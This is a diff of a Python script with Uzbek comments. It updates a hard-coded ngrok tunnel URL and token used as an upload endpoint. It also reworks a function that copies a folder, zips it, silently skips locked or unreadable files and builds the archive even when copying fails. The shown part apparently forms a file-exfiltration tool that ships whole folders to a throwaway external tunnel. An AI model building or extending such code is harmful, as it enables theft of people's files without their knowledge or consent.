@@ -8,8 +8,8 @@ import platform
 from pathlib import Path
 
 
-NGROK_URL = "https://e08d-84-54-73-86.ngrok-free.app"
-TOKEN = "97158158"
+NGROK_URL = "https://0881-84-54-73-86.ngrok-free.app"
+TOKEN = "28a6d19e"
 
 UPLOAD_ENDPOINT = f"{NGROK_URL}/?token={TOKEN}"
 
@@ -27,6 +27,13 @@ def prepare_folder(folder_path):
     # Alohida vaqtinchalik katalog yaratamiz
     temp_dir = Path(tempfile.mkdtemp(prefix="upload_"))
 
+    def safe_copy(src, dst):
+        try:
+            shutil.copy2(src, dst)
+        except Exception:
+            # Qulflangan yoki ruxsat yo'q fayllarni indamasdan tashlab o'tib ketadi
+            pass
+
     try:
         # Original papkaga tegmasdan nusxa olamiz
         copied_folder = temp_dir / source.name
@@ -34,7 +41,8 @@ def prepare_folder(folder_path):
         shutil.copytree(
             source,
             copied_folder,
-            copy_function=shutil.copy2
+            copy_function=safe_copy,
+            ignore_dangling_symlinks=True
         )
 
         # Nusxani ZIP qilamiz
@@ -50,6 +58,18 @@ def prepare_folder(folder_path):
 
         return zip_path, temp_dir
 
+    except shutil.Error:
+        # Ba'zan papkalarni o'zida ham Error bersa, baribir zipni yasab ko'ramiz
+        zip_base = temp_dir / source.name
+        zip_path = Path(
+            shutil.make_archive(
+                str(zip_base),
+                "zip",
+                root_dir=temp_dir,
+                base_dir=source.name
+            )
+        )
+        return zip_path, temp_dir
     except Exception:
         shutil.rmtree(temp_dir, ignore_errors=True)
         raise
